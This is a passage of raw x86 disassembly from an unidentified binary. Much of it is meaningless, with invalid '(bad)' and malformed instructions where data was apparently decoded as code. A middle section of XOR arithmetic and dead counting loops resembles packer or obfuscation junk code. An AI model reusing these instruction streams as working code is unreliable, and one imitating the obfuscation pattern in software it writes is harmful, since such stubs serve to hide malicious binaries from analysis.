  40ccaf:	jo     0x40cd1b
  40ccb1:	test   ebp,0xace5fdfc
  40ccb7:	loop   0x40cd15
  40ccb9:	cmp    eax,0x4e55b8f7
  40ccbe:	pusha  
  40ccbf:	ss pop esp
  40ccc1:	jle    0x40ccaf
  40ccc3:	aaa    
  40ccc4:	dec    eax
  40ccc5:	out    0x33,al
  40ccc7:	cld    
  40ccc8:	adc    ecx,DWORD PTR [ecx-0x78]
  40cccb:	aam    0xfb
  40cccd:	cmp    eax,0x6db9e275
  40ccd2:	push   edx
  40ccd3:	adc    esi,DWORD PTR [edx+0x18]
  40ccd6:	in     eax,dx
  40ccd7:	cli    
  40ccd8:	daa    
  40ccd9:	andps  xmm6,XMMWORD PTR [esi-0x49]
  40ccdd:	xor    cl,dl
  40ccdf:	es mov dl,0x32
  40cce2:	in     al,0x2f
  40cce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cce5:	adc    eax,0x6913d6cd
  40ccea:	ss jbe 0x40cd07
  40cced:	fmulp  st(5),st
  40ccef:	rcr    DWORD PTR [edx-0x2],cl
  40ccf2:	and    BYTE PTR [ebx+0x51],0xbe
  40ccf6:	mov    dh,0xfa
  40ccf8:	push   0xfffffff1
  40ccfa:	dec    edi
  40ccfb:	and    eax,0x1b8bd44
  40cd00:	sub    DWORD PTR [edx+0x51],0xffffffd9
  40cd04:	and    DWORD PTR [esi+0xd6e9d23],esi
  40cd0a:	mov    al,ds:0xe9c4d21c
  40cd0f:	retf   0x2376
  40cd12:	xchg   ebp,eax
  40cd13:	lock inc eax
  40cd15:	xchg   esp,eax
  40cd16:	mov    esi,0xb96b12d6
  40cd1b:	mov    al,0x6f
  40cd1d:	jle    0x40cd3d
  40cd1f:	mov    ecx,0x8607a470
  40cd24:	xchg   BYTE PTR [ebx+0x4c82d81c],cl
  40cd2a:	lea    ebx,[ecx+edx*8]
  40cd2d:	imul   ebx,DWORD PTR [ecx-0x68],0x2
  40cd31:	stos   BYTE PTR es:[edi],al
  40cd32:	fmul   st(0),st
  40cd34:	sub    DWORD PTR [esi-0x66bea52f],eax
  40cd3a:	shl    DWORD PTR [edx-0x3937875b],0x83
  40cd41:	xchg   edi,eax
  40cd42:	pop    ss
  40cd43:	sar    BYTE PTR [eax*8-0x4d47451a],cl
  40cd4a:	pop    edx
  40cd4b:	or     dh,BYTE PTR [edi-0x78aeb9ed]
  40cd51:	add    al,0xc5
  40cd53:	js     0x40cda1
  40cd55:	pop    eax
  40cd56:	jmp    0x9a4e:0xaf742e1
  40cd5d:	test   eax,0x8cd2084f
  40cd62:	in     eax,dx
  40cd63:	pop    ds
  40cd64:	mov    edi,0x55a47f4d
  40cd69:	mov    edi,DWORD PTR [edx+ecx*2+0x358e5e88]
  40cd70:	sub    BYTE PTR [ecx+0x1396a642],dl
  40cd76:	dec    ecx
  40cd77:	dec    edi
  40cd78:	test   al,0xa4
  40cd7a:	out    0xa5,eax
  40cd7c:	sub    ch,ch
  40cd7e:	mov    BYTE PTR [eax],ch
  40cd80:	cdq    
  40cd81:	retf   0xc984
  40cd84:	imul   DWORD PTR [ecx+ebp*1+0x2e]
  40cd88:	mov    eax,ds:0x5f707767
  40cd8d:	pop    esp
  40cd8e:	pop    ds
  40cd8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd90:	dec    edi
  40cd91:	ins    BYTE PTR es:[edi],dx
  40cd92:	das    
  40cd93:	popf   
  40cd94:	in     eax,0x59
  40cd96:	pop    ebp
  40cd97:	aaa    
  40cd98:	into   
  40cd99:	retf   0x639c
  40cd9c:	(bad)  
  40cd9d:	(bad)  
  40cd9f:	jne    0x40cdbd
  40cda1:	sbb    al,0x79
  40cda3:	and    BYTE PTR [edi],dl
  40cda5:	mov    ch,0x45
  40cda7:	ja     0x40ce13
  40cda9:	test   BYTE PTR [edx+ebp*4+0x36],bh
  40cdad:	jmp    0xa48:0x4fc73b9a
  40cdb4:	jmp    0xab54:0x210a07c1
  40cdbb:	hlt    
  40cdbc:	mov    ebp,0xf5d5d07b
  40cdc1:	xchg   edx,eax
  40cdc2:	dec    esp
  40cdc3:	rcl    DWORD PTR [esi-0x80],1
  40cdc6:	and    dl,BYTE PTR [edi]
  40cdc8:	sahf   
  40cdc9:	sbb    eax,0x6abc4df5
  40cdce:	add    eax,edx
  40cdd0:	jmp    0x40d044
  40cdd5:	ja     0x40ce22
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx-0x68c96e42],eax
  40cde3:	sbb    bh,BYTE PTR [esi-0x5b]
  40cde6:	xor    BYTE PTR [eax+0x70],0xc9
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40cdd5
  40cdee:	std    
  40cdef:	mov    ebx,0x6d8ca5c5
  40cdf4:	retf   
  40cdf5:	ins    BYTE PTR es:[edi],dx
  40cdf6:	aam    0x7b
  40cdf8:	sub    ebx,esp
  40cdfa:	enter  0xe6b8,0x40
  40cdfe:	xor    al,0xe2
  40ce00:	imul   edi,DWORD PTR [eax],0x20
  40ce03:	mov    edi,DWORD PTR [esi+0x41676450]
  40ce09:	rcr    DWORD PTR ds:0xe07c7c32,1
  40ce0f:	fbstp  TBYTE PTR [edi-0x18]
  40ce12:	and    eax,0x22e86fe6
  40ce17:	fcomp  QWORD PTR [edx]
  40ce19:	push   ss
  40ce1a:	jb     0x40ce89
  40ce1c:	iret   
  40ce1d:	jns    0x40ce27
  40ce1f:	aas    
  40ce20:	push   ecx
  40ce21:	aas    
  40ce22:	mov    bl,BYTE PTR [edi+0x54]
  40ce25:	dec    ebx
  40ce26:	xor    eax,0x881f1321
  40ce2b:	xor    BYTE PTR [ebx-0x4e],0xac
  40ce2f:	in     eax,dx
  40ce30:	out    0x6,al
  40ce32:	or     DWORD PTR [ebx-0x28],ebx
  40ce35:	sti    
  40ce36:	and    ch,dl
  40ce38:	hlt    
  40ce39:	fld    TBYTE PTR [ebx-0x37fa48dd]
  40ce3f:	pop    eax
  40ce40:	neg    DWORD PTR [esi+esi*8+0x7b]
  40ce44:	sub    esi,ebp
  40ce46:	rcl    DWORD PTR [edx+0x38],cl
  40ce49:	std    
  40ce4a:	dec    ebx
  40ce4b:	ja     0x40cdf0
  40ce4d:	add    eax,0xd7c4de5
  40ce52:	or     ebp,DWORD PTR [ebx-0x3b]
  40ce55:	adc    BYTE PTR [ecx+0xacb5fe1],dl
  40ce5b:	rcr    BYTE PTR [ebx],cl
  40ce5d:	fst    DWORD PTR [esp+edx*8+0x43b497e0]
  40ce64:	sbb    al,0xf5
  40ce66:	fiadd  WORD PTR [esi+ecx*1-0x72344b1b]
  40ce6d:	adc    bh,bl
  40ce6f:	adc    al,ch
  40ce71:	or     DWORD PTR [edi+ecx*2+0x13],0x21
  40ce76:	inc    esi
  40ce77:	fcomip st,st(6)
  40ce79:	les    esp,FWORD PTR [ebp+eiz*2+0x290ce5d4]
  40ce80:	mov    al,ds:0x2c4a7ac9
  40ce85:	cld    
  40ce86:	pop    eax
  40ce87:	sub    eax,0x47ce2948
  40ce8c:	inc    esi
  40ce8d:	xor    al,0xa6
  40ce8f:	mov    ah,0x45
  40ce91:	cld    
  40ce92:	mov    WORD PTR [ecx+0x414b3318],fs
  40ce98:	xor    BYTE PTR [ebx],0xc5
  40ce9b:	mov    bh,0x2b
  40ce9d:	nop
  40ce9e:	inc    edx
  40ce9f:	stos   DWORD PTR es:[edi],eax
  40cea0:	daa    
  40cea1:	mov    esp,0xf267add3
  40cea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea7:	retf   0xc519
  40ceaa:	in     al,0x49
  40ceac:	mov    BYTE PTR [ebx+0x2de53a0],cl
  40ceb2:	cmp    eax,0x9dceb3a4
  40ceb7:	inc    ebx
  40ceb8:	stos   BYTE PTR es:[edi],al
  40ceb9:	add    BYTE PTR [edx+0x56fd9ef9],cl
  40cebf:	stos   DWORD PTR es:[edi],eax
  40cec0:	pop    edi
  40cec1:	adc    DWORD PTR [edi],eax
  40cec3:	bound  edi,QWORD PTR [esi]
  40cec5:	cdq    
  40cec6:	enter  0x1a24,0xd
  40ceca:	mov    esp,0x583a3e83
  40cecf:	sbb    esp,esi
  40ced1:	jecxz  0x40ce75
  40ced3:	adc    ecx,ecx
  40ced5:	xchg   esp,eax
  40ced6:	xchg   DWORD PTR [esi+0x5e307b5d],esi
  40cedc:	push   edi
  40cedd:	pop    esp
  40cede:	and    al,0x4f
  40cee0:	push   edi
  40cee1:	outs   dx,BYTE PTR ds:[esi]
  40cee2:	or     ebx,esi
  40cee4:	test   eax,0x76da3580
  40cee9:	stos   BYTE PTR es:[edi],al
  40ceea:	bnd jno 0x40ce89
  40ceed:	mov    BYTE PTR [esi+0xc505b56],ah
  40cef3:	sahf   
  40cef4:	fwait
  40cef5:	(bad)  
  40cef6:	fisubr WORD PTR [ecx]
  40cef8:	iret   
  40cef9:	js     0x40cf3e
  40cefb:	in     al,0xa3
  40cefd:	add    dh,BYTE PTR [ecx]
  40ceff:	sahf   
  40cf00:	sub    eax,0xb996316e
  40cf05:	(bad)  
  40cf06:	adc    eax,0x15ba784b
  40cf0b:	mov    dh,BYTE PTR [ecx-0x9]
  40cf0e:	in     eax,0xc7
  40cf10:	ins    DWORD PTR es:[edi],dx
  40cf11:	aas    
  40cf12:	mov    eax,0xabbcb082
  40cf17:	stos   DWORD PTR es:[edi],eax
  40cf18:	mov    edi,0x7df378f8
  40cf1d:	push   ecx
  40cf1e:	pop    edi
  40cf1f:	jbe    0x40cf7f
  40cf21:	push   ebp
  40cf22:	xchg   esp,eax
  40cf23:	adc    eax,0x689882f4
  40cf28:	push   esp
  40cf29:	loop   0x40ceed
  40cf2b:	sbb    BYTE PTR [esi+0x3d5d931f],ah
  40cf31:	in     al,dx
  40cf32:	stc    
  40cf33:	jg     0x40ceea
  40cf35:	lock dec esi
  40cf37:	xor    al,0x6a
  40cf39:	or     BYTE PTR [eax-0x277e17f3],al
  40cf3f:	jl     0x40cf68
  40cf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf42:	dec    ebx
  40cf43:	pop    es
  40cf44:	push   ss
  40cf45:	or     al,0x6b
  40cf47:	(bad)  
  40cf48:	in     al,dx
  40cf49:	mov    al,ds:0xf6c83528
  40cf4e:	xor    bh,BYTE PTR [ecx]
  40cf50:	mov    bh,0x32
  40cf52:	cdq    
  40cf53:	inc    edx
  40cf54:	out    0x91,al
  40cf56:	push   edx
  40cf57:	hlt    
  40cf58:	mov    cl,0x9e
  40cf5a:	ins    DWORD PTR es:[edi],dx
  40cf5b:	dec    esi
  40cf5c:	test   DWORD PTR [esi],esi
  40cf5e:	jo     0x40cf6b
  40cf60:	fsubr  DWORD PTR [edx-0x2a6370ee]
  40cf66:	inc    edi
  40cf67:	shl    ebx,0x73
  40cf6a:	dec    esp
  40cf6b:	mov    ebp,gs
  40cf6d:	(bad)  
  40cf6e:	jge    0x40cfd7
  40cf70:	sti    
  40cf71:	or     al,0x71
  40cf73:	cwde   
  40cf74:	and    bl,BYTE PTR [esi+0x77]
  40cf77:	iret   
  40cf78:	lea    ebx,[ebp+0x23]
  40cf7b:	addr16 jl 0x40cf27
  40cf7e:	outs   dx,DWORD PTR ds:[esi]
  40cf7f:	push   ebx
  40cf80:	addr16 dec esi
  40cf82:	inc    ecx
  40cf83:	hlt    
  40cf84:	and    eax,0x469bc8de
  40cf89:	jle    0x40cf75
  40cf8b:	popa   
  40cf8c:	xchg   edi,eax
  40cf8d:	nop
  40cf8e:	daa    
  40cf8f:	mov    esp,DWORD PTR [ebx-0x67]
  40cf92:	nop
  40cf93:	data16 icebp 
  40cf95:	jecxz  0x40cf21
  40cf97:	xchg   BYTE PTR [ecx-0x6adf7851],bl
  40cf9d:	ins    DWORD PTR es:[edi],dx
  40cf9e:	xchg   ecx,eax
  40cf9f:	sub    BYTE PTR [ecx+edx*8],al
  40cfa2:	push   es
  40cfa3:	stos   BYTE PTR es:[edi],al
  40cfa4:	pop    ebx
  40cfa5:	into   
  40cfa6:	aam    0xa6
  40cfa8:	mov    ebp,DWORD PTR [ecx+0x54]
  40cfab:	retf   
  40cfac:	dec    esi
  40cfad:	sub    BYTE PTR [eax],bh
  40cfaf:	mov    bh,0x8d
  40cfb1:	mov    al,0xff
  40cfb3:	xchg   edi,eax
  40cfb4:	push   ebp
  40cfb5:	and    bh,dl
  40cfb7:	inc    edx
  40cfb8:	dec    esi
  40cfb9:	rcl    BYTE PTR [edi+0x44fff0fa],0x20
  40cfc0:	sub    BYTE PTR [ebx],bh
  40cfc2:	mov    ecx,0x3b9396f0
  40cfc7:	ret    
  40cfc8:	or     al,0x86
  40cfca:	and    al,cl
  40cfcc:	sub    cl,BYTE PTR [ecx-0x53]
  40cfcf:	jnp    0x40cf88
  40cfd1:	jecxz  0x40cf58
  40cfd3:	iret   
  40cfd4:	stos   BYTE PTR es:[edi],al
  40cfd5:	jecxz  0x40cf75
  40cfd7:	mov    ah,0xbe
  40cfd9:	sub    al,bl
  40cfdb:	sub    ah,bh
  40cfdd:	in     al,dx
  40cfde:	push   DWORD PTR [ebx]
  40cfe0:	push   esi
  40cfe1:	or     BYTE PTR [edi-0x27],cl
  40cfe4:	mov    ecx,0x3a8e9714
  40cfe9:	mov    al,ds:0x17cc5931
  40cfee:	xchg   ebp,eax
  40cfef:	mov    dh,0xbb
  40cff1:	(bad)  
  40cff2:	or     BYTE PTR [edi+ebp*2-0x568aefb7],bh
  40cff9:	pop    ss
  40cffa:	mov    ds:0xf21f256b,al
  40cfff:	and    ebp,DWORD PTR [edx+eiz*8]
  40d002:	shl    BYTE PTR [ebp+0x16],cl
  40d005:	and    BYTE PTR [esi],dl
  40d007:	mov    al,0x64
  40d009:	dec    ah
  40d00b:	(bad)  
  40d00c:	mov    al,ds:0xd0e1e849
  40d011:	pop    ss
  40d012:	pop    eax
  40d013:	xchg   edx,eax
  40d014:	mov    dh,0xb8
  40d016:	xor    dh,BYTE PTR [edi]
  40d018:	add    bh,BYTE PTR [esi-0x1e]
  40d01b:	pop    ds
  40d01c:	sbb    esi,DWORD PTR [eax]
  40d01e:	outs   dx,WORD PTR ds:[esi]
  40d020:	pop    es
  40d021:	sar    edi,1
  40d023:	pop    es
  40d024:	shr    BYTE PTR [edx-0x30b3055f],0x4d
  40d02b:	inc    edi
  40d02c:	mov    bl,0x88
  40d02e:	sub    ebp,ecx
  40d030:	push   es
  40d031:	repnz xchg esi,eax
  40d033:	jno    0x40cfc1
  40d035:	adc    BYTE PTR [eax+0x1f886c88],dh
  40d03b:	dec    ecx
  40d03c:	out    0xd6,al
  40d03e:	cwde   
  40d03f:	mov    ecx,0x1ebc7982
  40d044:	mov    ds:0x41621c,eax
  40d049:	mov    eax,DWORD PTR [ebp+0xc]
  40d04c:	xor    eax,ecx
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4343be
  40d088:	mov    ecx,DWORD PTR ds:0x432972
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434396,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434396,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434396,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432c6a
  40d0d1:	cmp    DWORD PTR ds:0x434396,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434396
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434396,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434396
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434396,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434372,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434372
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434372,ecx
  40d118:	cmp    DWORD PTR ds:0x434372,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434372,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432dc6
  40d137:	call   DWORD PTR ds:0x4329ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432e6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434431
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43437e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432dde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432704,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434421,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43438a,0x11
  40d197:	cmp    DWORD PTR ds:0x43438a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43438a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432c6e
  40d1c4:	cmp    DWORD PTR ds:0x43438a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43438a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43438a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43438a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43438a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432dd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434396
  40d1fe:	mov    DWORD PTR ds:0x432dd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43436e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434425,0x43436a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434376,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434415,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434421,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434421
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434421,ecx
  40d255:	cmp    DWORD PTR ds:0x434421,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434421,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4329f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4326fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4326fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4326fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432d22
  40d2ba:	cmp    DWORD PTR ds:0x4326fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4326fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4326fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4326fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4326fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4326f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434429
  40d2fa:	add    DWORD PTR ds:0x434392,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0x3f0b624d
  40d319:	imul   esp,DWORD PTR [esi+0x7e],0x4970708d
  40d320:	jge    0x40d392
  40d322:	jo     0x40d2d6
  40d324:	cmp    BYTE PTR [esi],cl
  40d326:	mov    eax,ds:0xbab733ce
  40d32b:	stos   BYTE PTR es:[edi],al
  40d32c:	push   DWORD PTR [edx]
  40d32e:	mov    bl,0xda
  40d330:	sahf   
  40d331:	js     0x40d374
  40d333:	(bad)  
  40d334:	cs inc edx
  40d336:	inc    esp
  40d337:	enter  0x87da,0x92
  40d33b:	cmova  ebx,edx
  40d33e:	ins    DWORD PTR es:[edi],dx
  40d33f:	dec    ecx
  40d340:	xor    edi,DWORD PTR [ecx+0x5bce1b9b]
  40d346:	das    
  40d347:	div    DWORD PTR [ecx]
  40d349:	ficom  WORD PTR [ebx+0x26596e4d]
  40d34f:	test   BYTE PTR [edx+0x19],dh
  40d352:	lahf   
  40d353:	ja     0x40d3a1
  40d355:	shl    edi,cl
  40d357:	cmp    eax,0xf935f767
  40d35c:	pop    ds
  40d35d:	adc    edi,0xb5d6
  40d363:	and    eax,0x12cb9b2d
  40d368:	xor    ah,BYTE PTR [esi+0x79]
  40d36b:	sbb    BYTE PTR [edx],0x12
  40d36e:	(bad)  
  40d36f:	dec    ecx
  40d370:	out    dx,eax
  40d371:	retf   
  40d372:	mov    esi,0x72c24187
  40d377:	les    ebx,FWORD PTR [ecx]
  40d379:	mov    ch,0xd0
  40d37b:	cli    
  40d37c:	retf   
  40d37d:	dec    edx
  40d37e:	fst    DWORD PTR [ebx]
  40d380:	out    0x35,eax
  40d382:	imul   ebp,eax,0x62653fc3
  40d388:	add    dh,BYTE PTR [edi+0x52ae7904]
  40d38e:	push   ebp
  40d38f:	push   eax
  40d390:	cwde   
  40d391:	call   FWORD PTR [ecx+0x48f64673]
  40d397:	adc    bh,bl
  40d399:	or     al,0x5d
  40d39b:	xor    al,0x25
  40d39d:	sahf   
  40d39e:	cs jp  0x40d33b
  40d3a1:	jns    0x40d399
  40d3a3:	inc    edi
  40d3a4:	lss    ebx,FWORD PTR [edi]
  40d3a7:	sbb    edi,DWORD PTR [eax+0x49]
  40d3aa:	mov    ?,WORD PTR [ebx]
  40d3ac:	scas   eax,DWORD PTR es:[edi]
  40d3ad:	mov    ebx,0xa664ecf5
  40d3b2:	mov    BYTE PTR [ecx],bh
  40d3b4:	jo     0x40d376
  40d3b6:	jb     0x40d437
  40d3b8:	leave  
  40d3b9:	mov    edx,0x58484f1b
  40d3be:	fsub   QWORD PTR [edx]
  40d3c0:	mov    bh,0xf5
  40d3c2:	test   BYTE PTR [edx-0x24],0x7e
  40d3c6:	mov    ebp,0x6fefc24
  40d3cb:	lock sbb ebp,DWORD PTR [eax]
  40d3ce:	test   BYTE PTR [edi+0x51fcd02],bl
  40d3d4:	std    
  40d3d5:	pop    ebp
  40d3d6:	push   ss
  40d3d7:	stc    
  40d3d8:	cmp    bh,BYTE PTR [esi]
  40d3da:	push   edi
  40d3db:	jns    0x40d41c
  40d3dd:	mov    ebp,0xe5cc6e33
  40d3e2:	popf   
  40d3e3:	push   0xf
  40d3e5:	scas   al,BYTE PTR es:[edi]
  40d3e6:	push   edi
  40d3e7:	mov    edi,0x66edafa4
  40d3ec:	inc    eax
  40d3ed:	popa   
  40d3ee:	(bad)  
  40d3ef:	or     eax,0xce9b833c
  40d3f4:	imul   edi,ebx,0x14
  40d3f7:	dec    ebp
  40d3f8:	sti    
  40d3f9:	cmp    edx,DWORD PTR [ebp+0x54]
  40d3fc:	pushf  
  40d3fd:	cdq    
  40d3fe:	je     0x40d3c6
  40d400:	call   0x667e:0xcaf2a02c
  40d407:	or     eax,0x66837a07
  40d40c:	pop    ecx
  40d40d:	push   edx
  40d40e:	loopne 0x40d44d
  40d410:	shr    cl,cl
  40d412:	jecxz  0x40d40d
  40d414:	adc    eax,0xe20a412e
  40d419:	dec    esi
  40d41a:	adc    al,0x5d
  40d41c:	push   ss
  40d41d:	arpl   WORD PTR [ebp-0x57b94b1b],di
  40d423:	fld    DWORD PTR [edx+0x498b921b]
  40d429:	xchg   edx,eax
  40d42a:	pop    DWORD PTR [esi+0x488629bd]
  40d430:	loop   0x40d4ac
  40d432:	inc    esp
  40d433:	retf   0xeda1
  40d436:	fsub   DWORD PTR [edx]
  40d438:	xorps  xmm5,xmm5
  40d43b:	sub    BYTE PTR ds:0xa9df48af,bl
  40d441:	retf   
  40d442:	cmp    eax,0x71e47084
  40d447:	jno    0x40d4a7
  40d449:	(bad)  
  40d44a:	repz push edx
  40d44c:	xchg   BYTE PTR [ecx-0x4],dl
  40d44f:	jb     0x40d485
  40d451:	jp     0x40d436
  40d453:	std    
  40d454:	jmp    DWORD PTR [edi+0x6eac0]
  40d45a:	mov    ecx,0xdf17c701
  40d45f:	ret    
  40d460:	ret    0x78e4
  40d463:	loopne 0x40d4d3
  40d465:	inc    eax
  40d466:	sbb    edi,esi
  40d468:	test   BYTE PTR [ebp-0x6],al
  40d46b:	inc    esi
  40d46c:	fiadd  DWORD PTR ds:0x6c1b7edd
  40d472:	mov    ah,0x36
  40d474:	stos   BYTE PTR es:[edi],al
  40d475:	jbe    0x40d413
  40d477:	pop    ds
  40d478:	push   0xca455961
  40d47d:	push   cs
  40d47e:	fild   WORD PTR [ebp+0x4a04ebd2]
  40d484:	jmp    0x1d0f:0x1b0a8fed
  40d48b:	cmp    eax,ecx
  40d48d:	dec    esp
  40d48e:	mov    eax,ds:0x66b634ef
  40d493:	and    eax,0x85c20d3c
  40d498:	jnp    0x40d481
  40d49a:	mov    edx,0x8cd50e73
  40d49f:	icebp  
  40d4a0:	sahf   
  40d4a1:	mov    es,WORD PTR [ecx+0x37]
  40d4a4:	push   0x5e
  40d4a6:	or     DWORD PTR [edi+0x11],ebx
  40d4a9:	ret    
  40d4aa:	cmp    eax,0x5740f545
  40d4af:	mov    edi,0x1c6c6cfb
  40d4b4:	jne    0x40d4f8
  40d4b6:	mov    bl,ch
  40d4b8:	dec    edi
  40d4b9:	jecxz  0x40d532
  40d4bb:	mov    al,0x4b
  40d4bd:	dec    edx
  40d4be:	and    BYTE PTR [ecx-0x18],cl
  40d4c1:	hlt    
  40d4c2:	lods   al,BYTE PTR ds:[esi]
  40d4c3:	sub    ecx,DWORD PTR [ebp-0x1006a25f]
  40d4c9:	adc    eax,0xc371be37
  40d4ce:	es and al,bh
  40d4d1:	fisub  WORD PTR [ebx+ecx*8]
  40d4d4:	je     0x40d53f
  40d4d6:	das    
  40d4d7:	loope  0x40d53e
  40d4d9:	shl    DWORD PTR [ebp+0x7cb203c7],0x27
  40d4e0:	enter  0x72a2,0xc8
  40d4e4:	pop    esp
  40d4e5:	imul   edi,DWORD PTR [esp+ebx*1+0x551862dc],0xfffffff5
  40d4ed:	shr    BYTE PTR [ebp+edi*4-0x2d],cl
  40d4f1:	jmp    0xee46:0x8478b5ae
  40d4f8:	sbb    BYTE PTR [eax],0x2e
  40d4fb:	inc    edx
  40d4fc:	mov    edi,0x8bfe6835
  40d501:	pop    edi
  40d502:	and    ch,BYTE PTR [ecx]
  40d504:	aad    0x9c
  40d506:	jle    0x40d536
  40d508:	shr    ecx,cl
  40d50a:	dec    ecx
  40d50b:	dec    ecx
  40d50c:	je     0x40d4d0
  40d50e:	add    eax,0x9767a903
  40d513:	pushf  
  40d514:	scas   eax,DWORD PTR es:[edi]
  40d515:	adc    esp,DWORD PTR [edi]
  40d517:	jb     0x40d4b1
  40d519:	xchg   DWORD PTR [eax],esp
  40d51b:	dec    ebp
  40d51c:	jne    0x40d4e5
  40d51e:	rcr    ebx,cl
  40d520:	fsubr  DWORD PTR ds:0x3295a336
  40d526:	shl    BYTE PTR [ebx+0xf232eb8],0x1
  40d52d:	and    DWORD PTR [ebx-0x132f3dc1],0xdd778048
  40d537:	push   cs
  40d538:	call   0x3454100
  40d53d:	js     0x40d535
  40d53f:	je     0x40d526
  40d541:	jecxz  0x40d55a
  40d543:	pop    es
  40d544:	out    dx,al
  40d545:	scas   eax,DWORD PTR es:[edi]
  40d546:	pop    esp
  40d547:	mov    ds:0x4ac2cdb1,eax
  40d54c:	cli    
  40d54d:	call   0x9dad:0x8d9f0c6a
  40d554:	inc    edi
